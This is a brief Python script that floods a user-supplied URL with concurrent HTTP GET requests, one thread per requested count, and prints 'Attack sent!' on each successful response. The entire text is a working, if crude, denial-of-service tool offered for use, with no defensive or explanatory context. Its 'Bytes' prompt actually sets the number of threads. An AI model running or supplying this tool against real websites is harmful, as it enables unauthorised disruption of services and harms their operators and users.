import threading, requests

url = input("URL: ")
byte_s = int(input("Bytes: "))


def r_send():
    response = requests.get(url)

    if response.status_code == 200:
        print(f"\033[32m[+]\033[0m Attack sent!")


for i in range(byte_s):
    thread = threading.Thread(target=r_send)
    thread.start()

input("\nPress any key to continue . . . ")
